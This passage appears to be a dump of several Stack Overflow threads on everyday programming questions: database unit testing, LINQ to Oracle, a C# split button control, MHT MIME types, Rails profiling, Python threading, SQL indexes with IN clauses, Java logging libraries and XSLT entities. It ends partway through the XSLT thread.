<p>A common mocking scenario, in a nutshell.  Of course you will still probably want to unit test your actual database calls too, for which you will need to hit the database.</p>
 <p>I can perhaps give you a taste of our experience when we began looking at unit testing our middle-tier process that included a ton of ""business logic"" sql operations.</p>

<p>We first created an abstraction layer that allowed us to ""slot in"" any reasonable database connection (in our case, we simply supported a single ODBC-type connection).</p>

<p>Once this was in place, we were then able to do something like this in our code (we work in C++, but I'm sure you get the idea):</p>

<p>GetDatabase().ExecuteSQL( ""INSERT INTO foo ( blah, blah )"" )</p>

<p>At normal run time, GetDatabase() would return an object that fed all our sql (including queries), via ODBC directly to the database.</p>

<p>We then started looking at in-memory databases - the best by a long way seems to be SQLite. (<a href=""http://www.sqlite.org/index.html"">http://www.sqlite.org/index.html</a>).  It's remarkably simple to set up and use, and allowed us subclass and override GetDatabase() to forward sql to an in-memory database that was created and destroyed for every test performed.</p>

<p>We're still in the early stages of this, but it's looking good so far, however we do have to make sure we create any tables that are required and populate them with test data - however we've reduced the workload somewhat here by creating a generic set of helper functions that can do a lot of all this for us.</p>

<p>Overall, it has helped immensely with our TDD process, since making what seems like quite innocuous changes to fix certain bugs can have quite strange affects on other (difficult to detect) areas of your system - due to the very nature of sql/databases.</p>

<p>Obviously, our experiences have centred around a C++ development environment, however I'm sure you could perhaps get something similar working under PHP/Python.</p>

<p>Hope this helps.</p>
 <p>Setting up test data for unit tests can be a challenge.</p>

<p>When it comes to Java, if you use Spring APIs for unit testing, you can control the transactions on a unit level. In other words, you can execute unit tests which involves database updates/inserts/deletes and rollback the changes. At the end of the execution you leave everything in the database as it was before you started the execution. To me, it is as good as it can get.</p>
"
"Is there a Way to use Linq to Oracle <p>I can connect with the DataContext to the Oracle database however I get errors in running the query against the oracle database.  I looked at the SQL generated and it is for MSSQL and not Oracle PSQL.  </p>

<p>Does anybody know of a decent easy to use wrapper to use LINQ against an Oracle Database?</p>
 <p>Not an easy way, at least until a good provider is produced.</p>

<p>Really MS should provide at least an OLEDB Linq provider.  After all, Linq to Sql is basically an implementation of IQueryable with designer support.</p>
 <p>No, LINQ to SQL is very much MS SQL only - think of it as a client driver.</p>

<p><a href=""http://forums.microsoft.com/MSDN/ShowPost.aspx?PostID=1623471&amp;SiteID=1"">Microsoft is/was helping Oracle and DataDirect develop providers for Oracle and other non-MS database servers.</a></p>
 <p>One thing you might look into is that there is now LINQ to Entities, which leverages the MS Entity Framework, which I believe is DB agnostic. I'm still looking into how it works myself, but if you could create an ADO.NET Data Entity that interfaces with Oracle, you could then use LINQ against that Entity.</p>
 <p>Do look at Linq to entities though.  I have a datareader populate a collection of objects that are mapped to the oracle table.  I can use linq to query that collection in very powerful, simple, and easy ways.  I love it.  Highly recommend.</p>
 <p>We use the OraDirect driver from Devart. It includes ADO.NET Entity framework support. You can download a trial version <a href=""http://www.devart.com/news/2008/directs475.html"" rel=""nofollow"">here</a>. You may then use LINQ to entities or entity SQL on top of this.</p>

<p>The pricing of this is quite developer friendly, you pay per developer seat and you may use it however you like.  </p>

<p>Another big advantage of this driver is that you can use it without installing an Oracle client, this is a big plus and worth the price alone.</p>

<p>@Greg: We evaluated the datadirect drivers as well, but the performance was poor and  cost astronomical.</p>

<p>Edit: It seems DevArt announced a beta with  <a href=""http://devart.com/news/2008/linq100b.html"" rel=""nofollow"">LINQ support</a> recently</p>
 <p>There's also <a href=""http://www.mindscape.co.nz/products/LightSpeed/"" rel=""nofollow"">Lightspeed</a> which has a per-organization (not per-developer) license scheme and seems to have a pretty solid documentation library and a free trial version (up to 8 entities).  I'm checking this out presently.</p>
 <p>After a long search I found <a href=""http://code.google.com/p/dblinq2007/"" rel=""nofollow"">DbLinq</a> and should do the trick. I am going to try it myself. I came across your question because I was searching for the same solution. Hope it helps.</p>
 <p>Why not try ALinq ？ <a href=""http://www.alinq.org"" rel=""nofollow"">http://www.alinq.org</a></p>
 <p>Try Devart <a href=""http://www.devart.com/linqconnect"" rel=""nofollow"">LinqConnect</a>. This product allows you to work with Oracle, etc.</p>
 <p>Look in codeplex:
<a href=""http://linqtooracle.codeplex.com/"" rel=""nofollow"">Linq To Oracle project</a></p>
 <p>Another cross-database solution that works fairly well across Oracle, SQLite, MySQL and SQL Server is <a href=""http://www.devexpress.com/products/NET/ORM/"" rel=""nofollow"">eXpress Persistent Objects</a></p>
"
"What control is this? (""Open"" Button with Drop Down) <p>The ""Open"" button on the open file dialog used in certain windows applications includes a dropdown arrow with a list of additional options -- namely ""Open with.."".  </p>

<p>I haven't seen this in every windows application, so you may have to try a few to get it, but SQL Server Management Studio and Visual Studio 2005 will both show the button that way if you go to the menu and choose <em>File->Open->File...</em></p>

<p>I want to use a button like this with a built-in list in one of my applications, but I can't find the control they're using anywhere in visual studio.  I should clarify that I'm looking for that specific button, not the entire dialog.  Any thoughts?</p>
 <p>I don't think there's a built-in control that can do it in .NET.  I'm poking around in the MSDN documentation for the standard Windows Button control, but it doesn't look like it's there.</p>

<p>I did find a <a href=""http://www.codeproject.com/KB/buttons/SplitButton.aspx"" rel=""nofollow"">Code Project article</a> with a custom implementation; this might help a little.</p>
 <p>I've not familiar with using either of these, but try searching msdn for splitbutton or dropdownbutton.  I think those are similar to what you're looking for.</p>
 <p>I think what you are looking for is called a toolStripSplitButton. It is only available in a toolStrip. But you can add a toolStripContainer anywhere on your form and then put the toolStrip and toolStripSplitButton inside your container. </p>

<p>You won't want to show the grips so you'll want to set your gripMargin = 0. You can also set your autosize=true so that the toolstrip conforms to your button.  The button will just look like a normal button (except for the split part) on your form.</p>
 <p>Since I found the control in Windows itself, I was hoping to find it built-in somewhere already so I didn't have to add anything to my code-base to use it.  But the split button at <a href=""http://blogs.msdn.com/jfoscoding/articles/491523.aspx"" rel=""nofollow"">this link</a> (found via the msdn suggestion) looks pretty promising.</p>

<p>I'll try it later myself, but I don't know how well it will handle visual styles.</p>
 <p>Here's my split button implementation.  It does not draw the arrow, and the focus/unfocus behavior is a little different.</p>

<p>Both mine and the originals handle visual styles and look great with Aero.</p>

<p><strong>Based on <a href=""http://wyday.com/splitbutton/"" rel=""nofollow"">http://wyday.com/splitbutton/</a></strong></p>

<pre><code>using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using System.Drawing;
using System.ComponentModel;
using System.Diagnostics;

// Original: http://blogs.msdn.com/jfoscoding/articles/491523.aspx
// Wyatt's fixes: http://wyday.com/splitbutton/
// Trimmed down and redone significantly from that version (Nick 5/6/08)
namespace DF
{
    public class SplitButton : Button
    {
        private ContextMenuStrip m_SplitMenu = null;
        private const int SplitSectionWidth = 14;
        private static int BorderSize = SystemInformation.Border3DSize.Width * 2;
        private bool mBlockClicks = false;
        private Timer mTimer;

        public SplitButton()
        {
            this.AutoSize = true;
            mTimer = new Timer();
            mTimer.Interval = 100;
            mTimer.Tick += new EventHandler(mTimer_Tick);
        }

        private void mTimer_Tick(object sender, EventArgs e)
        {
            mBlockClicks = false;
            mTimer.Stop();
        }

        #region Properties
        [DefaultValue(null)]
        public ContextMenuStrip SplitMenu
        {
            get
            {
                return m_SplitMenu;
            }
            set
            {
                if (m_SplitMenu != null)
                    m_SplitMenu.Closing -= 
                        new ToolStripDropDownClosingEventHandler(m_SplitMenu_Closing);

                m_SplitMenu = value;

                if (m_SplitMenu != null)
                    m_SplitMenu.Closing += 
                        new ToolStripDropDownClosingEventHandler(m_SplitMenu_Closing);
            }
        }

        private void m_SplitMenu_Closing(object sender, ToolStripDropDownClosingEventArgs e)
        {
            HideContextMenuStrip();
            // block click events for 0.5 sec to prevent re-showing the menu

        }

        private PushButtonState _state;
        private PushButtonState State
        {
            get
            {
                return _state;
            }
            set
            {
                if (!_state.Equals(value))
                {
                    _state = value;
                    Invalidate();
                }
            }
        }

        #endregion Properties

        protected override void OnEnabledChanged(EventArgs e)
        {
            if (Enabled)
                State = PushButtonState.Normal;
            else
                State = PushButtonState.Disabled;

            base.OnEnabledChanged(e);
        }

        protected override void OnMouseClick(MouseEventArgs e)
        {
            if (e.Button != MouseButtons.Left)
                return;
            if (State.Equals(PushButtonState.Disabled))
                return;
            if (mBlockClicks)
                return;

            if (!State.Equals(PushButtonState.Pressed))
                ShowContextMenuStrip();
            else
                HideContextMenuStrip();
        }

        protected override void OnMouseEnter(EventArgs e)
        {
            if (!State.Equals(PushButtonState.Pressed) &amp;&amp; !State.Equals(PushButtonState.Disabled))
            {
                State = PushButtonState.Hot;
            }
        }

        protected override void OnMouseLeave(EventArgs e)
        {
            if (!State.Equals(PushButtonState.Pressed) &amp;&amp; !State.Equals(PushButtonState.Disabled))
            {
                if (Focused)
                {
                    State = PushButtonState.Default;
                }

                else
                {
                    State = PushButtonState.Normal;
                }
            }
        }

        protected override void OnPaint(PaintEventArgs pevent)
        {
            base.OnPaint(pevent);

            Graphics g = pevent.Graphics;
            Rectangle bounds = this.ClientRectangle;

            // draw the button background as according to the current state.
            if (State != PushButtonState.Pressed &amp;&amp; IsDefault &amp;&amp; !Application.RenderWithVisualStyles)
            {
                Rectangle backgroundBounds = bounds;
                backgroundBounds.Inflate(-1, -1);
                ButtonRenderer.DrawButton(g, backgroundBounds, State);

                // button renderer doesnt draw the black frame when themes are off =(
                g.DrawRectangle(SystemPens.WindowFrame, 0, 0, bounds.Width - 1, bounds.Height - 1);
            }
            else
            {
                ButtonRenderer.DrawButton(g, bounds, State);
            }

            StringFormat format = new StringFormat();
            format.Alignment = StringAlignment.Center;
            format.LineAlignment = StringAlignment.Center;

            g.DrawString(Text, Font, SystemBrushes.ControlText, bounds, format);
        }

        private void ShowContextMenuStrip()
        {
            State = PushButtonState.Pressed;
            if (m_SplitMenu != null)
            {
                m_SplitMenu.Show(this, new Point(0, Height), ToolStripDropDownDirection.BelowRight);
            }
        }

        private void HideContextMenuStrip()
        {
            State = PushButtonState.Normal;
            m_SplitMenu.Hide();
            mBlockClicks = true;
            mTimer.Start();
        }
    }
}
</code></pre>
 <p>I used the draggable search in Spy++ (installed with VS) to look at the split open button on the file-open dialog of VS.</p>

<p>This revealed that it's an ordinary windows button with a style which includes BS_DEFSPLITBUTTON.   That's a magic keyword which gets you to some interesting places, including</p>

<p><a href=""http://www.codeplex.com/windowsformsaero/SourceControl/FileView.aspx?itemId=212902&amp;changeSetId=9930"">http://www.codeplex.com/windowsformsaero/SourceControl/FileView.aspx?itemId=212902&amp;changeSetId=9930</a></p>

<p>and here</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/bb775949.aspx#using_splits"">http://msdn.microsoft.com/en-us/library/bb775949.aspx#using_splits</a></p>

<p>Hope this helps you.  </p>

<p>EDIT:</p>

<p>I've actually just tried that code from CodePlex and it does create a split button - but you do have to make sure you've set the button's FlatStyle to 'System' rather than 'Standard' which is the default.   I've not bothered to hook-up the event handling stuff for the drop-down, but that's covered in the MSDN link, I think.</p>

<p>Of course, this is Vista-only (but doesn't need Aero enabled, despite the name on codeplex) - if you need earlier OS support, you'll be back to drawing it yourself.</p>
 <p>I remembered that <a href=""http://ketarin.canneverbe.com/"" rel=""nofollow"" title=""Ketarin"">Ketarin</a> has a button like that. </p>

<p>Using <a href=""http://www.red-gate.com/products/reflector/"" rel=""nofollow"" title=""Reflector"">Reflector</a> I found great open source control called <a href=""http://wyday.com/splitbutton/"" rel=""nofollow"" title=""wyDay.SplitButton"">wyDay.SplitButton</a>.
<img src=""http://i.stack.imgur.com/yDT06.png"" alt=""wyDay.SplitButton""></p>
"
"Content Type for MHT files <p>What is the content type for MHT files?</p>
 <p>message/rfc822</p>

<p>RFC 822 - STANDARD FOR THE FORMAT OF ARPA INTERNET TEXT MESSAGES</p>

<p>Here is a hyperlink: <a href=""http://www.faqs.org/rfcs/rfc822.html"" rel=""nofollow"">message/rfc822</a></p>
 <p>application/octet-stream</p>

<p>You can stream the contents of a .eml file to a browser with this content type and .mht as the extension, and the email will be rendered similar to the way it is rendered in an email client.</p>
 <p>Microsoft, who co-authored the spec for MHT, seem to think that it should be '<code>message/rfc822</code>' on <a href=""http://support.microsoft.com/kb/937912"">this support page</a>.</p>

<p>No specific MIME type seems to be given in the spec though:
<a href=""http://tools.ietf.org/html/rfc2557"">RFC2557: MIME Encapsulation of Aggregate Documents, such as HTML (MHTML)</a> </p>
 <p>""MIME Encapsulation of Aggregate Documents, such as HTML"" (MHTML or MHT) is an IETF standard proposed in 1999 in the <a href=""http://tools.ietf.org/html/rfc2557"" rel=""nofollow"">RFC 2557</a>.</p>

<p>Its MIME type is <code>multipart/related</code> and the extension is <code>.mht</code>.</p>

<p>See also:</p>

<ul>
<li><a href=""http://tools.ietf.org/html/rfc2557"" rel=""nofollow"">http://tools.ietf.org/html/rfc2557</a></li>
<li><a href=""http://en.wikipedia.org/wiki/MHTML"" rel=""nofollow"">http://en.wikipedia.org/wiki/MHTML</a></li>
</ul>
 <p>I know this is old, but I thought it should be clarified and explained in more detail...</p>

<p>@Guy Starbuck wrote:</p>

<blockquote>
  <p>message/rfc822</p>
  
  <p>RFC 822 - STANDARD FOR THE FORMAT OF ARPA INTERNET TEXT MESSAGES</p>
</blockquote>

<p>The problem with this answer is that MHTML files <strong><em>are not defined by RFC822</em></strong>.</p>

<p>The correct content-type for MHTML files (.mht, .mhtml) is <strong><em>multipart/related</em></strong>.</p>

<p>As stated above, <a href=""http://www.ietf.org/rfc/rfc0822.txt"" rel=""nofollow"">RFC822</a> defines the format for internet <em>text messages</em>.  The content-type <strong><em>message/rfc822</em></strong> is used for text attachments within email messages [1][2].</p>

<p>Most of us have probably received a reply to an email where, instead of being quoted inline, the original message is included as an attachment.  That <em>attachment</em> has a content-type of <strong><em>message/rfc822</em></strong>.  In such emails, the content-types break down as follows:</p>

<ul>
<li><em><strong>multipart/mixed</em></strong> = entire message</li>
<li><em><strong>text/plain</em></strong> = text of reply email</li>
<li><em><strong>message/rfc822</em></strong> = original email as attachment</li>
</ul>

<p>On the other hand, as noted by @feeela, <strong>MHTML</strong> files are defined in <a href=""http://www.ietf.org/rfc/rfc2557.txt"" rel=""nofollow"">RFC2557</a>.  MHTML files are comprised of many different parts, each of which can have a different content-type.  However, RFC2557 defines the content-type of the <strong>entire</strong> file as <strong><em>multipart/related</em></strong>.</p>

<p>[1]  <a href=""http://www.ietf.org/rfc/rfc1341.txt"" rel=""nofollow"">RFC1341:  MIME (Multipurpose Internet Mail Extensions)</a><br>
[2]  <a href=""http://www.w3.org/Protocols/rfc1341/7_3_Message.html"" rel=""nofollow"">The <strong>message</strong> Content-Type</a>  </p>
"
"Profile a rails controller action <p>What is the best way to profile a controller action in Ruby on Rails. Currently I am using the brute-force method of throwing in <code>puts Time.now</code> calls between what I think will be a bottleneck. But that feels really, really dirty. There has got to be a better way.</p>
 <p>Use the Benchmark standard library and the various tests available in Rails (unit, functional, integration). Here's an example:</p>

<pre><code>def test_do_something
  elapsed_time = Benchmark.realtime do
    100.downto(1) do |index|
      # do something here
    end
  end
  assert elapsed_time &lt; SOME_LIMIT
end
</code></pre>

<p>So here we just do something 100 times, time it via the Benchmark library, and ensure that it took less than SOME_LIMIT amount of time.</p>

<p>You also may find these links useful: The <a href=""http://www.ruby-doc.org/stdlib/libdoc/benchmark/rdoc/classes/Benchmark.html#M000011"">Benchmark.realtime reference</a> and the <a href=""http://www.ruby-doc.org/stdlib/libdoc/test/unit/rdoc/classes/Test/Unit.html"">Test::Unit reference</a>. Also, if you're into the 'book reading' thing, I picked up the idea for the example from <a href=""http://www.pragprog.com/titles/rails2/agile-web-development-with-rails"">Agile Web Development with Rails</a>, which talks all about the different testing types and a little on performance testing.</p>
 <p>There's a Railscast on profiling that's well worth watching</p>

<p><a href=""http://railscasts.com/episodes/98-request-profiling"">http://railscasts.com/episodes/98-request-profiling</a></p>
 <p>You might want to give the <a href=""http://www.fiveruns.com/products/tuneup"" rel=""nofollow"">FiveRuns TuneUp</a> service a try, as it's really rather impressive. <em>Disclaimer: I'm not associated with FiveRuns in any way, I've just tried this service out.</em></p>

<p>TuneUp is a free service whereby you download a plugin and when you run your application it injects a panel at the top of the screen that can be expanded to display detailed performance metrics.</p>

<p>It gives you some nice graphs, including one that shows what proportion of time is spent in the Model, View and Controller. You can even drill right down to see the individual SQL queries that ActiveRecord is executing if you need to and it can show you the underlying database schema with another click.</p>

<p>Finally, you can optionally upload your profiling data to the FiveRuns site for community performance analysis and advice.</p>
 <p>I picked up this technique a while back and have found it quite handy.</p>

<p>When it's in place, you can add <code>?profile=true</code> to any URL that hits a controller. Your action will run as usual, but instead of delivering the rendered page to the browser, it'll send a detailed, nicely formatted ruby-prof page that shows where your action spent its time.</p>

<p>First, add ruby-prof to your Gemfile, probably in the development group:</p>

<pre><code>group :development do
    gem ""ruby-prof""
end
</code></pre>

<p>Then add an <a href=""http://guides.rubyonrails.org/action_controller_overview.html#after-filters-and-around-filters"">around filter</a> to your ApplicationController:</p>

<pre><code>around_filter :profile if Rails.env == 'development'

def profile
  if params[:profile] &amp;&amp; result = RubyProf.profile { yield }

    out = StringIO.new
    RubyProf::GraphHtmlPrinter.new(result).print out, :min_percent =&gt; 0
    self.response_body = out.string

  else
    yield
  end
end
</code></pre>

<p>Reading the ruby-prof output is a bit of an art, but I'll leave that as an exercise.</p>

<p><strong>Additional note by ScottJShea:</strong>
If you want to change the measurement type place this:</p>

<p><code>RubyProf.measure_mode = RubyProf::GC_TIME #example</code></p>

<p>Before the <code>if</code> in the profile method of the application controller. You can find a list of the available measurements at the <a href=""https://github.com/rdp/ruby-prof#measurements"">ruby-prof page</a>. As of this writing the <code>memory</code> and <code>allocations</code> data streams seem to be corrupted (<a href=""https://github.com/rdp/ruby-prof/issues/86"">see defect</a>).</p>
 <p>This works in Rails 4.2.6:</p>

<pre><code>    o=OpenStruct.new(logger: Rails.logger)
    o.extend ActiveSupport::Benchmarkable
    o.benchmark 'name' do
      # ... your code ...
    end
</code></pre>
"
"How do threads work in Python, and what are common Python-threading specific pitfalls? <p>I've been trying to wrap my head around how threads work in Python, and it's hard to find good information on how they operate. I may just be missing a link or something, but it seems like the official documentation isn't very thorough on the subject, and I haven't been able to find a good write-up.</p>

<p>From what I can tell, only one thread can be running at once, and the active thread switches every 10 instructions or so?</p>

<p>Where is there a good explanation, or can you provide one? It would also be very nice to be aware of common problems that you run into while using threads with Python.</p>
 <p>Below is a basic threading sample. It will spawn 20 threads; each thread will output its thread number. Run it and observe the order in which they print.</p>

<pre><code>import threading
class Foo (threading.Thread):
    def __init__(self,x):
        self.__x = x
        threading.Thread.__init__(self)
    def run (self):
          print str(self.__x)

for x in xrange(20):
    Foo(x).start()
</code></pre>

<p>As you have hinted at Python threads are implemented through time-slicing. This is how they get the ""parallel"" effect. </p>

<p>In my example my Foo class extends thread, I then implement the <code>run</code> method, which is where the code that you would like to run in a thread goes. To start the thread you call <code>start()</code> on the thread object, which will automatically invoke the <code>run</code> method...</p>

<p>Of course, this is just the very basics. You will eventually want to learn about semaphores, mutexes, and locks for thread synchronization and message passing.</p>
 <p>Python's a fairly easy language to thread in, but there are caveats.  The biggest thing you need to know about is the Global Interpreter Lock.  This allows only one thread to access the interpreter.  This means two things:  1)  you rarely ever find yourself using a lock statement in python and 2) if you want to take advantage of multi-processor systems, you have to use separate processes.  EDIT:  I should also point out that you can put some of the code in C/C++ if you want to get around the GIL as well.</p>

<p>Thus, you need to re-consider why you want to use threads.  If you want to parallelize your app to take advantage of dual-core architecture, you need to consider breaking your app up into multiple processes.</p>

<p>If you want to improve responsiveness, you should CONSIDER using threads.  There are other alternatives though, namely <a href=""http://en.wikipedia.org/wiki/Microthread"" rel=""nofollow"">microthreading</a>.  There are also some frameworks that you should look into:</p>

<ul>
<li><a href=""http://www.stackless.com/"" rel=""nofollow"">stackless python</a></li>
<li><a href=""http://greenlet.readthedocs.org/en/latest/"" rel=""nofollow"">greenlets</a></li>
<li><a href=""http://www.gevent.org/"" rel=""nofollow"">gevent</a></li>
<li><a href=""https://github.com/saucelabs/monocle"" rel=""nofollow"">monocle</a></li>
</ul>
 <p>Yes, because of the Global Interpreter Lock (GIL) there can only run one thread at a time. Here are some links with some insights about this:</p>

<ul>
<li><a href=""http://www.artima.com/weblogs/viewpost.jsp?thread=214235"">http://www.artima.com/weblogs/viewpost.jsp?thread=214235</a></li>
<li><a href=""http://smoothspan.wordpress.com/2007/09/14/guido-is-right-to-leave-the-gil-in-python-not-for-multicore-but-for-utility-computing/"">http://smoothspan.wordpress.com/2007/09/14/guido-is-right-to-leave-the-gil-in-python-not-for-multicore-but-for-utility-computing/</a></li>
</ul>

<p>From the last link an interesting quote:</p>

<blockquote>
  <p>Let me explain what all that means. 
  Threads run inside the same virtual
  machine, and hence run on the same
  physical machine.  Processes can run
  on the same physical machine or in
  another physical machine.  If you
  architect your application around
  threads, you’ve done nothing to access
  multiple machines.  So, you can scale
  to as many cores are on the single
  machine (which will be quite a few
  over time), but to really reach web
  scales, you’ll need to solve the
  multiple machine problem anyway.</p>
</blockquote>

<p>If you want to use multi core, <a href=""http://www.python.org/dev/peps/pep-0371/"">pyprocessing</a> defines an process based API to do real parallelization. The <a href=""http://en.wikipedia.org/wiki/Python_Enhancement_Proposal#Development"">PEP</a> also includes some interesting benchmarks.</p>
 <p>Use threads in python if the individual workers are doing I/O bound operations. If you are trying to scale across multiple cores on a machine either find a good <a href=""http://www.python.org/dev/peps/pep-0371/"">IPC</a> framework for python or pick a different language.</p>
 <p>Try to remember that the GIL is set to poll around every so often in order to do show the appearance of multiple tasks. This setting can be fine tuned, but I offer the suggestion that there should be work that the threads are doing or lots of context switches are going to cause problems.</p>

<p>I would go so far as to suggest multiple parents on processors and try to keep like jobs on the same core(s).</p>
 <p>One easy solution to the GIL is the <a href=""http://docs.python.org/2/library/multiprocessing.html"" rel=""nofollow"" title=""Python docs link"">multiprocessing</a> module. It can be used as a drop in replacement to the threading module but uses multiple Interpreter processes instead of threads. Because of this there is a little more overhead than plain threading for simple things but it gives you the advantage of real parallelization if you need it.
It also easily scales to multiple physical machines.</p>

<p>If you need truly large scale parallelization than I would look further but if you just want to scale to all the cores of one computer or a few different ones without all the work that would go into implementing a more comprehensive framework, than this is for you.</p>
"
"Do indexes work with ""IN"" clause <p>If I have a query like:</p>

<pre><code>Select EmployeeId 
From Employee 
Where EmployeeTypeId IN (1,2,3)
</code></pre>

<p>and I have an index on the <code>EmployeeTypeId</code> field, does SQL server still use that index?</p>
 <p>Usually it would, unless the IN clause covers too much of the table, and then it will do a table scan.  Best way to find out in your specific case would be to run it in the query analyzer, and check out the execution plan.</p>
 <p>Yeah, that's right.  If your employee table has 10,000 records, and only 5 records have employeetypeID in (1,2,3), then it will most likely use the index to fetch the records.  However, if it finds that 9,000 records have the employeeIDType in (1,2,3), then it would most likely just do a table scan to get the corresponding EmployeeIDs, as it's faster just to run through the whole table than to go to each branch of the index tree and look at the records individually.  </p>

<p>SQL Server does a lot of stuff to try and optimize how the queries run.  However, sometimes it doesn't get the right answer.  If you know that SQL Server isn't using the index, by looking at the execution plan in query analyzer, you can tell the query engine to use a specific index with the following change to your query.</p>

<pre><code>Select EmployeeId From Employee WITH (Index(Index_EmployeeTypeId )) Where EmployeeTypeId IN (1,2,3)
</code></pre>

<p>Assuming the index you have on the EmployeeTypeId field is named Index_EmployeeTypeId. </p>
 <blockquote>
  <p>So there's the potential for an ""IN"" clause to run a table scan, but the optimizer will 
  try and work out the best way to deal with it?</p>
</blockquote>

<p>Whether an index is used doesn't so much vary on the type of query as much of the type and distribution of data in the table(s), how up-to-date your table statistics are, and the actual datatype of the column.</p>

<p>The other posters are correct that an index will be used over a table scan if:</p>

<ul>
<li>The query won't access more than a certain percent of the rows indexed (say ~10% but should vary between DBMS's).</li>
<li>Alternatively, if there are a lot of rows, but relatively few unique values in the column, it also may be faster to do a table scan.</li>
</ul>

<p>The other variable that might not be that obvious is making sure that the datatypes of the values being compared are the same. In PostgreSQL, I don't think that indexes will be used if you're filtering on a float but your column is made up of ints. There are also some operators that don't support index use (again, in PostgreSQL, the ILIKE operator is like this).</p>

<p>As noted though, always check the query analyser when in doubt and your DBMS's documentation is your friend.</p>
 <p>Unless technology has improved in ways I can't imagine of late, the ""IN"" query shown will produce a result that's effectively the OR-ing of three result sets, one for each of the values in the ""IN"" list. The IN clause becomes an equality condition for each of the list and will use an index if appropriate. In the case of unique IDs and a large enough table then I'd expect the optimiser to use an index.</p>

<p>If the items in the list were to be non-unique however, and I guess in the example that a ""TypeId"" is a foreign key, then I'm more interested in the distribution. I'm wondering if the optimiser will check the stats for each value in the list? Say it checks the first value and finds it's in 20% of the rows (of a large enough table to matter). It'll probably table scan. But will the same query plan be used for the other two, even if they're unique?</p>

<p>It's probably moot - something like an Employee table is likely to be small enough that it will stay cached in memory and you probably wouldn't notice a difference between that and indexed retrieval anyway.</p>

<p>And lastly, while I'm preaching, beware the query in the IN clause: it's often a quick way to get something working and (for me at least) can be a good way to express the requirement, but it's almost always better restated as a join. Your optimiser may be smart enough to spot this, but then again it may not. If you don't currently performance-check against production data volumes, do so - in these days of cost-based optimisation you can't be certain of the query plan until you have a full load and representative statistics. If you can't, then be prepared for surprises in production...</p>
 <p>@Mike: Thanks for the detailed analysis. There are definately some interesting points you make there. The example I posted is somewhat trivial but the basis of the question came from using NHibernate.</p>

<p>With NHibernate, you can write a clause like this:</p>

<pre><code>int[] employeeIds = new int[]{1, 5, 23463, 32523};
NHibernateSession.CreateCriteria(typeof(Employee))
.Add(Restrictions.InG(""EmployeeId"",employeeIds))
</code></pre>

<p>NHibernate then generates a query which looks like  </p>

<pre><code>select * from employee where employeeid in (1, 5, 23463, 32523)
</code></pre>

<p>So as you and others have pointed out, it looks like there are going to be times where an index will be used or a table scan will happen, but you can't really determine that until runtime.</p>
"
"Java Logging vs Log4J <p>Is it still worth to add the log4j library to a Java 5 project just to log
let's say some exceptions to a file with some nice rollover settings.
Or will the standard util.logging facility do the job as well?</p>

<p>What do you think?</p>
 <p>I'd say you're probably fine with util.logging for the needs you describe.</p>

<p>For a good decision tree, have a look at <a href=""http://java.sys-con.com/node/48541"">Log4j vs java.util.logging</a></p>

<blockquote>
  <p>Question One :
  Do you anticipate a need for any of the clever handlers that Log4j has that JUL does not have, such as the SMTPHandler, NTEventLogHandler, or any of the very convenient FileHandlers?</p>
  
  <p>Question Two :
  Do you see yourself wanting to frequently switch the format of your logging output? Will you need an easy, flexible way to do so? In other words, do you need Log4j's PatternLayout?</p>
  
  <p>Question Three :
  Do you anticipate a definite need for the ability to change complex logging configurations in your applications, after they are compiled and deployed in a production environment? Does your configuration sound something like, ""Severe messages from this class get sent via e-mail to the support guy; severe messages from a subset of classes get logged to a syslog deamon on our server; warning messages from another subset of classes get logged to a file on network drive A; and then all messages from everywhere get logged to a file on network drive B""? And do you see yourself tweaking it every couple of days?</p>
  
  <p>If you can answer yes to any of the above questions, go with Log4j. If you answer a definite no to all of them, JUL will be more than adequate and it's conveniently already included in the SDK.</p>
</blockquote>

<p>That said, pretty much every project these days seems to wind up including log4j, if only because some other library uses it.</p>
 <p>I would go with log4j. The possibilites with log4j is not obsolete at all!</p>
 <p>I recommend using <a href=""http://commons.apache.org/logging/"" rel=""nofollow"">Apache Commmons Logging</a> as your logging interface. That way you have the flexibility to switch logging implementations anytime you want without requiring any code changes on your end.</p>
 <p>I recommend that you use the <a href=""http://slf4j.org"">Simple Logging Facade for Java</a> (SLF4J). It supports different providers that include Log4J and can be used as a replacement for Apache Commons Logging.</p>
 <p>Log4j has been around for a long time, and it works very well.  I have no scientific study to back it, but based on what I've seen at a large number of clients, it is easily the logging framework that I see used more than any other.  It has been around for a long time, and not been replaced by the Next Big Logging Framework, which says something.  </p>

<p>It is dead simple to set up, and easy to learn the basic appenders (outputs).  There are a whole host appenders that are available, including:</p>

<ol>
<li>ConsoleAppender</li>
<li>DailyRollingFileAppender</li>
<li>ExternallyRolledFileAppender </li>
<li>FileAppender</li>
<li>JDBCAppender</li>
<li>JMSAppender</li>
<li>NTEventLogAppender</li>
<li>RollingFileAppender</li>
<li>SMTPAppender</li>
<li>SocketAppender</li>
<li>SyslogAppender</li>
<li>TelnetAppender</li>
<li>WriterAppender</li>
</ol>

<p>Plus others.  It isn't difficult to write your own appender either.  Additionally there is a great deal of flexibility in each of the appenders that allow you to control specifically what is output in your log.</p>

<p>One note, I had a series of classloader problems when I used apache commons logging in addition to log4j.  It was only for one specific application, but I found it simpler to use log4j alone, rather than to have the flexibility offered when using an abstraction layer like commons logging.    </p>

<p>See this article for
<a href=""http://www.qos.ch/logging/thinkAgain.jsp"">more details</a>:</p>

<p>Good luck!</p>
 <p>log4j is a much nicer package overall, and doesn't have some of the hiccups that java.util.logging contains.  I'd second that using log4j directly is easier than using the commons logging.</p>
 <p>java.util.logging offers a comprehensive logging package without the excess baggage some of the others provide..</p>
"
"using a html entity in xslt (e.g. &nbsp;) <p>What is the best way to include an html entity in XSLT?</p>

<pre><code>&lt;xsl:template match=""/a/node""&gt;
    &lt;xsl:value-of select="".""/&gt;
    &lt;xsl:text&gt;&amp;nbsp;&lt;/xsl:text&gt;
&lt;/xsl:template&gt;
</code></pre>

<p>this one returns a <strong>XsltParseError</strong></p>
 <p>You can use CDATA section</p>

<pre><code>&lt;xsl:text disable-output-escaping=""yes""&gt;&lt;![CDATA[&amp;nbsp;]]&gt;&lt;/xsl:text&gt;
</code></pre>

<p>or you can describe &amp;nbsp in local DTD:</p>

<pre><code>&lt;!DOCTYPE xsl:stylesheet [ &lt;!ENTITY nbsp ""&amp;#160;""&gt; ]&gt;
</code></pre>

<p>or just use <code>&amp;#160;</code> instead of <code>&amp;nbsp;</code></p>
 <blockquote>
  <p>this one returns a <strong>XsltParseError</strong></p>
</blockquote>

